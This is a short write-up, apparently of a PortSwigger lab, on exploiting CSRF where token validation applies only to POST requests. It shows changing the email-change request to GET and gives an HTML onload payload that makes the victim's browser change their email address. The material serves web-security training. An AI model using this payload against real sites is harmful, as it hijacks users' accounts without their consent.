
# CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: wiener:peter

Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

---------------------------------------------

Reference: https://portswigger.net/web-security/csrf

---------------------------------------------

Generated link: https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/




![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/1.png)



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/2.png)

It is a POST request:



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/3.png)

Change the method to GET:

/my-account/change-email?email=test3%40test.com




![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/4.png)

You get a redirection code, if you follow it the email is updated:



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/5.png)



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/6.png)


Payload:

```
<body onload="window.open('https://0af7002903ddc72c818c574600ce0059.web-security-academy.net/my-account/change-email?email=test3%40test.com')">
```



![img](images/CSRF%20where%20token%20validation%20depends%20on%20request%20method/7.png)